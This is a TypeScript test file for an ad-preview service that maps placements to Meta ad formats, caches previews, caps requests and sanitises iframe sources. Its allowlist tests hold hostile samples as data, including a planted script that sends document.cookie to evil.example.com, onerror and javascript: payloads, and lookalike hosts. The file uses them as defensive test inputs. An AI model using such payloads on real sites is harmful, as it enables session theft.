import { readdirSync, readFileSync, statSync } from "node:fs";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { FakeNoticesDb } from "./helpers/fake-notices-db";

/**
 * docs/IG-PAGE-ADS-SPEC.md D18, 7.4, 4.2 P1 and P2, 4.9 and PRM-08 acceptance 1 (promote-previews): the ad_format map, the
 * iframe allowlist (a planted script or a foreign host is dropped), the 1-hour cache (0 fetches the second time), the cap of 6
 * Meta previews per review and 30 a minute per member, the fallback to the local mock on 613 and 17, the user token only, and
 * the grep for the unscoped preview edge. Meta is the fake of 9.3; the route runs on an in-memory database.
 */

const fake = vi.hoisted(() => ({ db: null as unknown as FakeNoticesDb }));
const h = vi.hoisted(() => ({ getActor: vi.fn(), access: vi.fn() }));

vi.mock("@/lib/db", async () => {
  const { createFakeNoticesDb } = await import("./helpers/fake-notices-db");
  fake.db = createFakeNoticesDb(() => new Date("2026-10-31T10:00:00Z"));
  return { prisma: fake.db.client };
});
vi.mock("@/lib/auth", () => ({ getActor: h.getActor }));
vi.mock("@/lib/meta-connect", () => ({ getAssetAccess: h.access }));

import { POST as previewsRoute } from "@/app/api/promote/previews/route";
import type { AssetAccess } from "@/lib/meta-connect";
import { DEFAULT_PREVIEW_TABS, MAX_META_PREVIEWS_PER_REVIEW, PREVIEW_AD_FORMATS, PREVIEW_CACHE_MS } from "@/lib/promote/catalog/preview-formats";
import type { CreativeShapeInput } from "@/lib/promote/creative-shapes";
import { createPromoteMeta, THROTTLE_ATTEMPTS, type PromoteMeta } from "@/lib/promote/meta";
import {
  createPreviews,
  createPreviewState,
  draftMediaIds,
  draftPositions,
  instagramReady,
  MEMBER_PREVIEWS_PER_MINUTE,
  mockFor,
  parsePlacements,
  parsePreviewSpec,
  PREVIEW_IFRAME_SRC,
  PREVIEW_LABELS,
  previewAdFormat,
  previewsForActor,
  safePreviewSrc,
  shapeMediaOf,
  specHash,
  targetForDraftAd,
  targetForSpec,
  type DraftMediaRow,
  type PreviewRequest,
} from "@/lib/promote/previews";
import { createThrottle, type SettingStore } from "@/lib/promote/throttle";
import { PLACEMENT_KEYS, type PlacementKey } from "@/lib/promote/types";
import { HttpError } from "@/lib/tenancy";
import { createFakeMetaPromote, FAKE_IG_ID, FAKE_PAGE_ID, FAKE_USER_TOKEN, HOSTILE_PREVIEW_BODY, SAFE_PREVIEW_BODY, type FakeMetaPromote } from "./helpers/fake-meta-promote";

const T = "t_shop";
const ORIGIN = "https://wa.edwyz.com";
const T0 = Date.parse("2026-10-31T10:00:00Z");
const SAFE_SRC = "https://www.facebook.com/ads/api/preview_iframe.php?d=AQKfake&t=AQLfake";

function memoryStore(): SettingStore {
  const rows = new Map<string, unknown>();
  return { get: async (k) => (rows.has(k) ? structuredClone(rows.get(k)) : null), set: async (k, v) => void rows.set(k, structuredClone(v)) };
}

const ASSETS = (f: FakeMetaPromote): Record<string, AssetAccess> => ({
  ad_asset: { assetId: "ad_asset", type: "ad_account", externalId: "act_1", name: "Shop ads", token: FAKE_USER_TOKEN },
  page_asset: { assetId: "page_asset", type: "page", externalId: FAKE_PAGE_ID, name: "Fake Shop", token: f.pageToken() },
});

type Setup = { fake: FakeMetaPromote; meta: PromoteMeta; fetches: () => number; advance: (ms: number) => void; now: () => number };

function setup(): Setup {
  const f = createFakeMetaPromote();
  const fetch = vi.fn(f.fetch);
  vi.stubGlobal("fetch", fetch);
  let now = T0;
  const assets = ASSETS(f);
  const meta = createPromoteMeta({
    access: async (_t, id) => {
      const a = assets[id];
      if (!a) throw new HttpError(404, "Asset not found.");
      return a;
    },
    sandbox: async () => false,
    store: memoryStore(),
    throttle: createThrottle({ store: memoryStore(), now: () => now }),
    env: {},
    sleep: async () => undefined,
    now: () => now,
    readTimeoutMs: 2_000,
    writeTimeoutMs: 2_000,
  });
  return { fake: f, meta, fetches: () => fetch.mock.calls.length, advance: (ms) => void (now += ms), now: () => now };
}

const igSpec = (over: Partial<CreativeShapeInput> = {}): CreativeShapeInput => ({
  name: "Diwali reel",
  goal: "website_visits",
  source: "new",
  format: "single_image",
  pageId: FAKE_PAGE_ID,
  instagramUserId: FAKE_IG_ID,
  primaryText: "Diwali sale: 20% off everything this week.",
  headline: "Shop now",
  link: "https://shop.example.com/diwali",
  media: { imageHash: "abc123" },
  ...over,
});

function request(s: Setup, over: Partial<PreviewRequest> = {}): PreviewRequest {
  return { tenantId: T, userId: "u_admin", adAccountAssetId: "ad_asset", draftId: "draft_1", target: targetForSpec(igSpec()), placements: ["instagram_feed"], ...over };
}

let current: Setup;
beforeEach(() => {
  current = setup();
  fake.db.reset();
  h.getActor.mockReset();
  h.access.mockReset();
  for (const k of ["PROMOTE_ENABLED", "PROMOTE_PREVIEWS", "PROMOTE_EXPERIMENTAL"]) delete process.env[k];
});
afterEach(() => {
  current.fake.assertClean();
  vi.unstubAllGlobals();
});

const previewsWith = (s: Setup, env: Record<string, string> = {}) => createPreviews({ meta: s.meta, state: createPreviewState(), env, now: s.now });
const previewCalls = (f: FakeMetaPromote) => f.calls.filter((c) => /generatepreviews$|\/previews$/.test(c.path));

// =====================================================================================================================
// ad_format per position
// =====================================================================================================================

describe("the ad_format map (catalog/preview-formats)", () => {
  it("gives Meta's format for each preview tab and none for positions Meta can't preview", () => {
    expect(Object.fromEntries(DEFAULT_PREVIEW_TABS.map((k) => [k, previewAdFormat(k)]))).toEqual({
      instagram_feed: "INSTAGRAM_STANDARD",
      instagram_stories: "INSTAGRAM_STORY",
      instagram_reels: "INSTAGRAM_REELS",
      facebook_feed: "MOBILE_FEED_STANDARD",
      facebook_stories: "FACEBOOK_STORY_MOBILE",
      facebook_reels: "FACEBOOK_REELS_MOBILE",
    });
    for (const key of ["instagram_search", "facebook_search", "facebook_instream_video", "audience_network", "messenger_inbox"] as PlacementKey[]) expect(previewAdFormat(key), key).toBeNull();
    for (const key of PLACEMENT_KEYS) {
      const f = PREVIEW_AD_FORMATS[key];
      expect(previewAdFormat(key)).toBe(f === "local" || f === null ? null : f);
    }
  });

  it("sends each position's format to Meta, one call per tab, scoped to the ad account", async () => {
    const res = await previewsWith(current).preview(request(current, { placements: [...DEFAULT_PREVIEW_TABS] }));
    expect(res.call).toBe("P1");
    expect(res.previews.map((p) => [p.placement, p.adFormat, p.source])).toEqual(DEFAULT_PREVIEW_TABS.map((k) => [k, previewAdFormat(k), "meta"]));
    const calls = previewCalls(current.fake);
    expect(calls.map((c) => c.path)).toEqual(new Array(6).fill("act_1/generatepreviews"));
    expect(calls.map((c) => c.query.ad_format)).toEqual(DEFAULT_PREVIEW_TABS.map((k) => previewAdFormat(k)));
  });

  it("a position without a format, or PROMOTE_PREVIEWS=local, is the local mock with no Meta call", async () => {
    const res = await previewsWith(current).preview(request(current, { placements: ["instagram_search", "audience_network"] }));
    expect(res.previews.map((p) => [p.source, p.approximate, p.reason, p.label])).toEqual([
      ["local", true, "no_format", PREVIEW_LABELS.local],
      ["local", true, "no_format", PREVIEW_LABELS.local],
    ]);
    const off = await previewsWith(current, { PROMOTE_PREVIEWS: "local" }).preview(request(current, { placements: [...DEFAULT_PREVIEW_TABS] }));
    expect(off.previews.every((p) => p.approximate && p.reason === "previews_off" && p.src === null)).toBe(true);
    expect(current.fetches()).toBe(0);
  });

  it("the local mock carries the frame and the visible text of the position", () => {
    expect(mockFor("instagram_feed")).toEqual({ frame: "4:5", textLimit: 125 });
    expect(mockFor("facebook_feed")).toEqual({ frame: "4:5", textLimit: 50 });
    expect(mockFor("instagram_stories")).toEqual({ frame: "9:16", textLimit: 125 });
    expect(mockFor("instagram_reels")).toEqual({ frame: "9:16", textLimit: 44 });
    expect(mockFor("facebook_feed", true)).toEqual({ frame: "1:1", textLimit: 80 });
  });
});

// =====================================================================================================================
// Only an allowlisted iframe src
// =====================================================================================================================

describe("the iframe allowlist (7.4: anything else, scripts included, is dropped)", () => {
  it("keeps the preview page's src on www and business, entities decoded", () => {
    expect(safePreviewSrc(SAFE_PREVIEW_BODY)).toBe(SAFE_SRC);
    expect(safePreviewSrc('<iframe width="540" src="https://business.facebook.com/ads/api/preview_iframe.php?d=X&amp;t=Y"></iframe>')).toBe("https://business.facebook.com/ads/api/preview_iframe.php?d=X&t=Y");
    expect(PREVIEW_IFRAME_SRC.test(SAFE_SRC)).toBe(true);
  });

  it("drops a planted script and returns nothing but the src", () => {
    const planted = `${SAFE_PREVIEW_BODY}<script>fetch("https://evil.example.com/"+document.cookie)</script><img src=x onerror=alert(1)>`;
    expect(safePreviewSrc(planted)).toBe(SAFE_SRC);
    expect(safePreviewSrc(HOSTILE_PREVIEW_BODY)).toBeNull();
    expect(safePreviewSrc("<script>alert(1)</script>")).toBeNull();
  });

  it("refuses every foreign host, scheme, path, port, credential or injected character", () => {
    const bad = [
      "https://evil.example.com/ads/api/preview_iframe.php?d=1",
      "https://www.facebook.com.evil.example/ads/api/preview_iframe.php?d=1",
      "https://web.facebook.com/ads/api/preview_iframe.php?d=1",
      "https://m.facebook.com/ads/api/preview_iframe.php?d=1",
      "http://www.facebook.com/ads/api/preview_iframe.php?d=1",
      "https://www.facebook.com:8443/ads/api/preview_iframe.php?d=1",
      "https://user@www.facebook.com/ads/api/preview_iframe.php?d=1",
      "https://www.facebook.com/ads/api/other.php?d=1",
      "https://www.facebook.com/ads/api/preview_iframe.php",
      "https://www.facebook.com/ads/api/preview_iframe.php/../../x?d=1",
      "https://www.facebook.com/ads/api/preview_iframe.php?d=1 onload=alert(1)",
      "https://www.facebook.com/ads/api/preview_iframe.php?d=1&#34;&gt;&lt;script&gt;",
      "https://www.facebook.com\\@evil.example/ads/api/preview_iframe.php?d=1",
      "javascript:alert(1)//https://www.facebook.com/ads/api/preview_iframe.php?",
      "//www.facebook.com/ads/api/preview_iframe.php?d=1",
    ];
    for (const src of bad) expect(safePreviewSrc(`<iframe src="${src}"></iframe>`), src).toBeNull();
    // Only an iframe's src counts, and only text bodies are read.
    expect(safePreviewSrc(`<img src="${SAFE_SRC}">`)).toBeNull();
    expect(safePreviewSrc(`<iframe data-src="${SAFE_SRC}"></iframe>`)).toBeNull();
    expect(safePreviewSrc(null)).toBeNull();
    expect(safePreviewSrc({ body: SAFE_PREVIEW_BODY })).toBeNull();
  });

  it("a hostile answer from Meta becomes the local mock, and nothing of it reaches the result", async () => {
    current.fake.scenario("hostile_preview");
    const res = await previewsWith(current).preview(request(current, { placements: ["facebook_feed"] }));
    expect(res.previews[0]).toMatchObject({ source: "local", approximate: true, src: null, reason: "unsafe" });
    const json = JSON.stringify(res);
    for (const s of ["evil", "<script", "onload", "iframe"]) expect(json).not.toContain(s);
  });

  it("the pattern is a named exemption: no other source file names Meta's preview page", () => {
    const root = path.join(process.cwd(), "src");
    const walk = (dir: string, out: string[] = []): string[] => {
      for (const name of readdirSync(dir)) {
        const full = path.join(dir, name);
        if (statSync(full).isDirectory()) {
          if (name !== "generated") walk(full, out);
        } else if (/\.(ts|tsx|mjs)$/.test(name)) out.push(full);
      }
      return out;
    };
    const hits = walk(root).filter((f) => /preview_iframe/.test(readFileSync(f, "utf8"))).map((f) => path.relative(root, f).split(path.sep).join("/"));
    expect(hits).toEqual(["lib/promote/previews.ts"]);
  });
});

// =====================================================================================================================
// Cache, caps and fallbacks
// =====================================================================================================================

describe("the 1-hour cache and the caps (4.9, D18)", () => {
  it("the second identical request within an hour makes 0 fetches; after an hour Meta is asked again", async () => {
    const p = previewsWith(current);
    const first = await p.preview(request(current, { placements: ["instagram_feed", "facebook_feed"] }));
    expect(first.previews.map((x) => [x.source, x.cached, x.src])).toEqual([
      ["meta", false, SAFE_SRC],
      ["meta", false, SAFE_SRC],
    ]);
    const after = current.fetches();
    expect(after).toBe(2);
    current.advance(PREVIEW_CACHE_MS - 1_000);
    const again = await p.preview(request(current, { placements: ["instagram_feed", "facebook_feed"] }));
    expect(current.fetches()).toBe(after);
    expect(again.previews.every((x) => x.source === "meta" && x.cached && x.label === PREVIEW_LABELS.meta)).toBe(true);
    current.advance(2_000);
    await p.preview(request(current, { placements: ["instagram_feed"] }));
    expect(current.fetches()).toBe(after + 1);
  });

  it("the cache key is the workspace, the spec and the format: another workspace or another text asks Meta", async () => {
    const p = previewsWith(current);
    await p.preview(request(current));
    await p.preview(request(current, { tenantId: "t_other" }));
    await p.preview(request(current, { target: targetForSpec(igSpec({ primaryText: "New text" })) }));
    expect(current.fetches()).toBe(3);
    expect(specHash(targetForSpec(igSpec()))).toBe(specHash(targetForSpec(igSpec())));
    expect(specHash(targetForSpec(igSpec()))).not.toBe(specHash(targetForSpec(igSpec({ headline: "Other" }))));
  });

  it("two identical tabs at once make one Meta call", async () => {
    const p = previewsWith(current);
    const [a, b] = await Promise.all([p.preview(request(current)), p.preview(request(current))]);
    expect(a.previews[0].src).toBe(SAFE_SRC);
    expect(b.previews[0].src).toBe(SAFE_SRC);
    expect(current.fetches()).toBe(1);
  });

  it("the 7th Meta preview in a review comes back approximate; a cached tab never counts; a new review starts again", async () => {
    const seven: PlacementKey[] = [...DEFAULT_PREVIEW_TABS, "facebook_marketplace"];
    expect(MAX_META_PREVIEWS_PER_REVIEW).toBe(6);
    const p = previewsWith(current);
    const res = await p.preview(request(current, { placements: seven }));
    expect(res.previews.slice(0, 6).every((x) => x.source === "meta")).toBe(true);
    expect(res.previews[6]).toMatchObject({ placement: "facebook_marketplace", source: "local", approximate: true, reason: "review_cap", label: PREVIEW_LABELS.local });
    expect(current.fetches()).toBe(6);
    // Asked again: the six come from the cache, the seventh is still over the cap.
    const again = await p.preview(request(current, { placements: seven }));
    expect(again.previews.filter((x) => x.cached)).toHaveLength(6);
    expect(again.previews[6].reason).toBe("review_cap");
    expect(current.fetches()).toBe(6);
    // Another draft is another review.
    const other = await p.preview(request(current, { draftId: "draft_2", target: targetForSpec(igSpec({ name: "Other" })), placements: ["facebook_marketplace"] }));
    expect(other.previews[0].source).toBe("meta");
  });

  it("a member gets at most 30 Meta previews a minute; the rest is the local mock until the minute is over", async () => {
    const p = previewsWith(current);
    for (let i = 0; i < MEMBER_PREVIEWS_PER_MINUTE; i++) {
      const r = await p.preview(request(current, { draftId: `d_${i}`, target: targetForSpec(igSpec({ name: `v${i}` })), placements: ["facebook_feed"] }));
      expect(r.previews[0].source, `preview ${i + 1}`).toBe("meta");
    }
    const over = await p.preview(request(current, { draftId: "d_x", target: targetForSpec(igSpec({ name: "vx" })), placements: ["facebook_feed"] }));
    expect(over.previews[0]).toMatchObject({ source: "local", approximate: true, reason: "member_cap" });
    const otherMember = await p.preview(request(current, { userId: "u_other", draftId: "d_y", target: targetForSpec(igSpec({ name: "vy" })), placements: ["facebook_feed"] }));
    expect(otherMember.previews[0].source).toBe("meta");
    current.advance(61_000);
    const later = await p.preview(request(current, { draftId: "d_z", target: targetForSpec(igSpec({ name: "vz" })), placements: ["facebook_feed"] }));
    expect(later.previews[0].source).toBe("meta");
  });

  it("a 613 falls back to approximate, and the rest of the request asks Meta no more", async () => {
    current.fake.throttleNext({ code: 613, times: 3, match: /generatepreviews/ });
    const res = await previewsWith(current).preview(request(current, { placements: ["instagram_feed", "facebook_feed"] }));
    expect(res.previews.map((x) => [x.source, x.approximate, x.reason])).toEqual([
      ["local", true, "busy"],
      ["local", true, "busy"],
    ]);
    // Only the first tab reached Meta (promote/meta backs off within the call's deadline); the second never asked.
    const made = previewCalls(current.fake).length;
    expect(made).toBeGreaterThanOrEqual(1);
    expect(made).toBeLessThanOrEqual(THROTTLE_ATTEMPTS);
    expect(previewCalls(current.fake).every((c) => c.query.ad_format === "INSTAGRAM_STANDARD")).toBe(true);
    // The ad account now cools down: the next request makes no call either and is still approximate.
    const next = await previewsWith(current).preview(request(current, { placements: ["facebook_stories"] }));
    expect(next.previews[0]).toMatchObject({ source: "local", reason: "busy" });
    expect(previewCalls(current.fake)).toHaveLength(made);
  });

  it("a 17 falls back to approximate too, and other failures are the mock, never an error", async () => {
    current.fake.throttleNext({ code: 17, times: 3, match: /generatepreviews/ });
    const busy = await previewsWith(current).preview(request(current, { placements: ["facebook_feed"] }));
    expect(busy.previews[0]).toMatchObject({ source: "local", reason: "busy", approximate: true });
    // A fresh ad account (no cooldown): a creative Meta doesn't know answers an error, which is the mock too.
    const s2 = setup();
    current = s2;
    const failing = await previewsWith(s2).preview(request(s2, { target: { kind: "creative", creativeId: "999999999" }, placements: ["facebook_feed"] }));
    expect(failing.previews[0]).toMatchObject({ source: "local", reason: "failed", approximate: true });
  });
});

// =====================================================================================================================
// P1 and P2, the user token, Instagram identity
// =====================================================================================================================

describe("P1 before launch, P2 after, always the user token", () => {
  it("uses the user token for both calls, never a Page token", async () => {
    const p = previewsWith(current);
    const p1 = await p.preview(request(current, { placements: ["instagram_reels"] }));
    const p2 = await p.preview(request(current, { target: { kind: "creative", creativeId: "23850000000000004" }, placements: ["instagram_reels"] }));
    expect([p1.call, p2.call]).toEqual(["P1", "P2"]);
    const calls = previewCalls(current.fake);
    expect(calls.map((c) => c.path)).toEqual(["act_1/generatepreviews", "23850000000000004/previews"]);
    for (const c of calls) {
      expect(c.tokenKind).toBe("user");
      expect(c.token).toBe(FAKE_USER_TOKEN);
      expect(c.token).not.toBe(current.fake.pageToken());
    }
  });

  it("an Instagram tab needs the Page and the Instagram account in the spec; without the account it is the mock, Facebook still Meta's", async () => {
    const noIg = targetForSpec(igSpec({ instagramUserId: null }));
    expect(noIg.kind === "spec" && instagramReady(noIg.creative)).toBe(false);
    const withIg = targetForSpec(igSpec());
    expect(withIg.kind === "spec" && instagramReady(withIg.creative)).toBe(true);
    const res = await previewsWith(current).preview(request(current, { target: noIg, placements: ["instagram_feed", "facebook_feed"] }));
    expect(res.previews.map((x) => [x.placement, x.source, x.reason])).toEqual([
      ["instagram_feed", "local", "needs_instagram"],
      ["facebook_feed", "meta", null],
    ]);
  });

  it("an incomplete ad, or no ad account, is the mock with no call", async () => {
    const incomplete = targetForSpec(igSpec({ media: {} }));
    expect(incomplete).toEqual({ kind: "incomplete" });
    const p = previewsWith(current);
    expect((await p.preview(request(current, { target: incomplete }))).previews[0].reason).toBe("incomplete");
    expect((await p.preview(request(current, { adAccountAssetId: null }))).previews[0].reason).toBe("no_ad_account");
    expect(current.fetches()).toBe(0);
  });

  it("a launched draft ad previews its creative (P2); a draft builds the body launch sends (P1)", () => {
    expect(targetForDraftAd("traffic", { name: "Ad", creative: { metaCreativeId: "23850000000000004", pageId: FAKE_PAGE_ID } })).toEqual({ kind: "creative", creativeId: "23850000000000004" });
    const p1 = targetForDraftAd("traffic", { name: "Ad", creative: { pageId: FAKE_PAGE_ID, message: "Hello", link: "https://shop.example.com", imageHash: "abc" } });
    expect(p1.kind).toBe("spec");
    if (p1.kind === "spec") {
      expect(p1.creative).toMatchObject({ object_story_spec: { page_id: FAKE_PAGE_ID, link_data: { message: "Hello", link: "https://shop.example.com" } } });
      expect(p1.creative).not.toHaveProperty("status");
    }
    expect(targetForDraftAd("traffic", { name: "Ad", creative: { pageId: FAKE_PAGE_ID } })).toEqual({ kind: "incomplete" });
    expect(targetForDraftAd("nonsense", { name: "Ad", creative: {} })).toEqual({ kind: "incomplete" });
  });

  it("a promote draft's AdMedia ids become the Meta hashes and video ids launch sends; unresolved media stays incomplete", () => {
    const rows: DraftMediaRow[] = [
      { id: "m_img", kind: "image", metaImageHash: "img_hash_1", metaVideoId: null, metaThumbHash: null },
      { id: "m_tall", kind: "image", metaImageHash: "img_hash_tall", metaVideoId: null, metaThumbHash: null },
      { id: "m_vid", kind: "video", metaImageHash: null, metaVideoId: "120000000000001", metaThumbHash: "thumb_hash_1" },
    ];
    const single = { pageId: FAKE_PAGE_ID, message: "Diwali sale", link: "https://shop.example.com/diwali", format: "single_image", media: { feed: "m_img" } };
    expect(draftMediaIds({ ...single, cards: [{ mediaId: "m_vid" }, { mediaId: "../x" }] })).toEqual(["m_img", "m_vid"]);
    // Without the resolved media the AdMedia id is never sent: the tab is the mock.
    expect(targetForDraftAd("traffic", { name: "Ad", creative: single })).toEqual({ kind: "incomplete" });
    const built = targetForDraftAd("traffic", { name: "Ad", creative: single }, shapeMediaOf(single, rows));
    expect(built.kind).toBe("spec");
    expect(JSON.stringify(built)).toContain('"image_hash":"img_hash_1"');
    expect(JSON.stringify(built)).not.toContain("m_img");
    // A video row in an image slot, or a missing row, resolves to nothing.
    expect(shapeMediaOf({ media: { feed: "m_vid", video: "m_img" } }, rows).media).toMatchObject({ imageHash: null, videoId: null });
    expect(targetForDraftAd("traffic", { name: "Ad", creative: { ...single, media: { feed: "m_gone" } } }, shapeMediaOf({ ...single, media: { feed: "m_gone" } }, rows))).toEqual({ kind: "incomplete" });

    // Carousel: each card's image or video (with its thumbnail).
    const carousel = { ...single, format: "carousel", media: undefined, cards: [{ mediaId: "m_img", headline: "Sarees", link: "https://shop.example.com/s" }, { mediaId: "m_vid", headline: "Kurtas", link: "https://shop.example.com/k" }] };
    const cards = targetForDraftAd("traffic", { name: "Ad", creative: carousel }, shapeMediaOf(carousel, rows));
    expect(cards.kind === "spec" && (cards.creative.object_story_spec as { link_data: { child_attachments: unknown[] } }).link_data.child_attachments).toEqual([
      expect.objectContaining({ name: "Sarees", image_hash: "img_hash_1" }),
      expect.objectContaining({ name: "Kurtas", video_id: "120000000000001", image_hash: "thumb_hash_1" }),
    ]);

    // Per-placement assets follow the ad set's positions, as at launch.
    const tall = { ...single, media: { feed: "m_img", vertical: "m_tall" } };
    const rules = (positions: PlacementKey[]) => {
      const t = targetForDraftAd("traffic", { name: "Ad", creative: tall }, { ...shapeMediaOf(tall, rows), positions });
      return t.kind === "spec" ? (t.creative.asset_feed_spec as { asset_customization_rules: unknown[] }).asset_customization_rules.length : -1;
    };
    expect(rules([])).toBe(2);
    expect(rules(["facebook_feed"])).toBe(1);
    expect(draftPositions({ placements: ["facebook_feed", "nonsense", "facebook_feed"] })).toEqual(["facebook_feed"]);
    expect(draftPositions(null)).toEqual([]);
  });

  it("a boosted Facebook post draft with 'Also show on Instagram' keeps its Instagram account, as launch sends it", () => {
    const boost = { pageId: FAKE_PAGE_ID, instagramId: FAKE_IG_ID, message: "", format: "existing_post", fbPromotableId: `${FAKE_PAGE_ID}_5550001` };
    const plain = targetForDraftAd("boost_post", { name: "Boost", creative: boost });
    expect(plain.kind === "spec" && instagramReady(plain.creative)).toBe(false);
    const both = targetForDraftAd("boost_post", { name: "Boost", creative: { ...boost, alsoInstagram: true, igEligible: true } });
    expect(both.kind === "spec" && both.creative).toMatchObject({ object_story_id: `${FAKE_PAGE_ID}_5550001`, instagram_user_id: FAKE_IG_ID });
    expect(both.kind === "spec" && instagramReady(both.creative)).toBe(true);
  });

  it("an unsaved spec's post ids are tied to its own Page and Instagram account", () => {
    const boost = { ...igSpec(), goal: "engagement", source: "fb_post", format: "existing_post" };
    expect(parsePreviewSpec({ ...boost, promotableId: `${FAKE_PAGE_ID}_5550001` }).promotableId).toBe(`${FAKE_PAGE_ID}_5550001`);
    expect(parsePreviewSpec({ ...boost, promotableId: "5550001" }).promotableId).toBe("5550001");
    expect(() => parsePreviewSpec({ ...boost, promotableId: "555000111_5550001" })).toThrow(/this Facebook Page/);
    const ig = { ...igSpec(), goal: "engagement", source: "ig_media", format: "existing_post", igMediaId: "17900000000000001" };
    expect(parsePreviewSpec(ig).igMediaId).toBe("17900000000000001");
    expect(() => parsePreviewSpec({ ...ig, instagramUserId: null })).toThrow(/Instagram account the post is from/);
    // A post id of the other source (left over from switching) is ignored, never sent.
    const fresh = parsePreviewSpec({ ...igSpec(), promotableId: "555000111_5550001", igMediaId: "17900000000000001" });
    expect([fresh.promotableId, fresh.igMediaId]).toEqual([null, null]);
  });

  it("the spec is read field by field: unknown keys and the call-to-action proof switch are ignored, bad values refused", () => {
    const spec = parsePreviewSpec({ ...igSpec(), ctaOnBoost: true, status: "ACTIVE", daily: 1, evil: "<script>" });
    expect(spec).not.toHaveProperty("ctaOnBoost");
    expect(spec).not.toHaveProperty("status");
    expect(spec).not.toHaveProperty("evil");
    expect(() => parsePreviewSpec({ ...igSpec(), link: "javascript:alert(1)" })).toThrow(/https/);
    expect(() => parsePreviewSpec({ ...igSpec(), pageId: "../me" })).toThrow(/Facebook Page/);
    expect(() => parsePreviewSpec({ ...igSpec(), goal: "spend_it_all" })).toThrow(/goal/);
    expect(parsePlacements(undefined)).toEqual([...DEFAULT_PREVIEW_TABS]);
    expect(parsePlacements(["facebook_feed", "facebook_feed"])).toEqual(["facebook_feed"]);
    expect(() => parsePlacements(["instagram_explore"])).toThrow(HttpError);
    expect(() => parsePlacements([])).toThrow(HttpError);
  });
});

// =====================================================================================================================
// The grep rule (D18): the unscoped preview edge is never named
// =====================================================================================================================

describe("no unscoped /generatepreviews (D18)", () => {
  const files = ["src/lib/promote/previews.ts", "src/app/api/promote/previews/route.ts", "src/lib/promote/meta.ts"];
  it.each(files)("%s names the preview edge only behind an ad account", (file) => {
    const source = readFileSync(path.join(process.cwd(), file), "utf8");
    for (const m of source.matchAll(/generatepreviews/g)) {
      const before = source.slice(Math.max(0, (m.index ?? 0) - 30), m.index);
      expect(before, `${file}: ...${before}generatepreviews`).toMatch(/act_(X|\$\{[^}]+\})\/$/);
    }
    expect(source).not.toMatch(/["'`]\/?generatepreviews/);
  });
});

// =====================================================================================================================
// POST /api/promote/previews
// =====================================================================================================================

describe("POST /api/promote/previews", () => {
  const post = (body: unknown, origin: string | null = ORIGIN) =>
    previewsRoute(new Request(`${ORIGIN}/api/promote/previews`, { method: "POST", headers: origin ? { origin, "content-type": "application/json" } : {}, body: JSON.stringify(body) }), undefined as never);

  beforeEach(() => {
    process.env.SITE_URL = ORIGIN;
    h.getActor.mockResolvedValue({ userId: "u_admin", tenantId: T, role: "admin" });
    const assets = ASSETS(current.fake);
    h.access.mockImplementation(async (_t: string, id: string) => {
      const a = assets[id];
      if (!a) throw new HttpError(404, "Asset not found.");
      return a;
    });
    fake.db.seed("metaAsset", { id: "page_asset", tenantId: T, type: "page", externalId: FAKE_PAGE_ID }, { id: "ig_asset", tenantId: T, type: "instagram", externalId: FAKE_IG_ID }, { id: "ad_asset", tenantId: T, type: "ad_account", externalId: "act_1" });
    fake.db.seed("spendControl", { tenantId: T, spendingAdAccountAssetId: "ad_asset" });
    fake.db.seed("adCampaign", { id: "c_draft", tenantId: T, adAccountAssetId: "ad_asset", template: "traffic" }, { id: "c_other", tenantId: "t_other", adAccountAssetId: "ad_x", template: "traffic" });
    fake.db.seed("adSet", { id: "s_1", tenantId: T, campaignId: "c_draft" }, { id: "s_x", tenantId: "t_other", campaignId: "c_other" });
    fake.db.seed(
      "ad",
      { id: "a_1", tenantId: T, adSetId: "s_1", name: "Ad 1", status: "paused", format: "single_image", createdAt: new Date(T0), creative: { metaCreativeId: "23850000000000004", pageId: FAKE_PAGE_ID } },
      { id: "a_x", tenantId: "t_other", adSetId: "s_x", name: "Other", status: "draft", format: "single_image", createdAt: new Date(T0), creative: { pageId: FAKE_PAGE_ID, message: "x", link: "https://x.example", imageHash: "h" } },
    );
  });

  it("answers 404 while PROMOTE_ENABLED is off, before reading the member", async () => {
    const res = await post({ spec: igSpec(), placements: ["facebook_feed"] });
    expect(res.status).toBe(404);
    expect(h.getActor).not.toHaveBeenCalled();
  });

  it("is for admins and owners only, from the same origin", async () => {
    process.env.PROMOTE_ENABLED = "on";
    h.getActor.mockResolvedValue({ userId: "u_agent", tenantId: T, role: "agent" });
    expect((await post({ spec: igSpec() })).status).toBe(403);
    h.getActor.mockResolvedValue({ userId: "u_admin", tenantId: T, role: "admin" });
    expect((await post({ spec: igSpec() }, "https://evil.example.com")).status).toBe(403);
  });

  it("previews an unsaved spec on the spending ad account (P1) with the allowlisted src only", async () => {
    process.env.PROMOTE_ENABLED = "on";
    const res = await post({ spec: { ...igSpec(), name: "Route spec" }, placements: ["instagram_stories", "instagram_search"] });
    expect(res.status).toBe(200);
    expect(res.headers.get("cache-control")).toBe("no-store");
    const body = (await res.json()) as { call: string; previews: { source: string; src: string | null; reason: string | null }[] };
    expect(body.call).toBe("P1");
    expect(body.previews.map((p) => [p.source, p.src, p.reason])).toEqual([
      ["meta", SAFE_SRC, null],
      ["local", null, "no_format"],
    ]);
    expect(previewCalls(current.fake).map((c) => [c.path, c.tokenKind])).toEqual([["act_1/generatepreviews", "user"]]);
  });

  it("previews a saved draft's launched creative (P2), and never another workspace's draft", async () => {
    process.env.PROMOTE_ENABLED = "on";
    const ok = await post({ draftId: "c_draft", placements: ["facebook_reels"] });
    expect(ok.status).toBe(200);
    expect(((await ok.json()) as { call: string }).call).toBe("P2");
    expect((await post({ draftId: "c_other", placements: ["facebook_reels"] })).status).toBe(404);
    expect((await post({ draftId: "c_draft", adId: "a_x", placements: ["facebook_reels"] })).status).toBe(404);
  });

  it("refuses a Page or Instagram account that is not this workspace's, and a body with both or neither", async () => {
    process.env.PROMOTE_ENABLED = "on";
    expect((await post({ spec: igSpec({ pageId: "555000111" }) })).status).toBe(400);
    expect((await post({ spec: igSpec({ instagramUserId: "17840000000099999" }) })).status).toBe(400);
    expect((await post({ spec: igSpec(), draftId: "c_draft" })).status).toBe(400);
    expect((await post({ placements: ["facebook_feed"] })).status).toBe(400);
    expect(previewCalls(current.fake)).toHaveLength(0);
  });

  it("refuses another Page's post, an Instagram post without this workspace's account, and a lead form not of this Page, before any Meta call", async () => {
    process.env.PROMOTE_ENABLED = "on";
    const boost = { ...igSpec(), goal: "engagement", source: "fb_post", format: "existing_post" };
    // Another Page's post (say a client's dark post the same Facebook login can see) through this workspace's own Page.
    const other = await post({ spec: { ...boost, promotableId: "555000111_5550001" }, placements: ["facebook_feed"] });
    expect(other.status).toBe(400);
    expect(((await other.json()) as { error: string }).error).toMatch(/this Facebook Page/);
